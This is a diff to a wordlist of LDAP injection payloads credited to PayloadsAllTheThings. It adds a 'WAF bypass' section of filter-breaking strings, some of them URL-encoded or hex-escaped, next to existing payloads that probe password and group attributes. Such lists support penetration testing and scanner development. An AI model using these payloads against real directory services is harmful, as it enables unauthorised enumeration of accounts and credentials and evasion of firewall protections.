@@ -1,6 +1,6 @@
 # LDAP Injection payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 54 payloads
+# Total: 63 payloads
 *
 *)(&
 *))%00
@@ -57,3 +57,15 @@ admin)(&(objectCategory=person)(sAMAccountName=*
 x)(&(userPassword=*))(|(userPassword=*
 *)(|(memberOf=*)
 *)(&(objectClass=group)(cn=*
+
+# --- WAF bypass ---
+# encoded / modern filters
+*)(objectClass=*)
+*)(|(objectClass=*))
+admin*)(&(objectClass=*)
+admin)(|(cn=*))
+*)(&(uid=*)(cn=*))
+*)(|(mail=*)(sn=*))
+\2a)(uid=\2a)
+%2a%29%28%7c%28%75%69%64%3d%2a%29%29
+*))(|(objectClass=*)
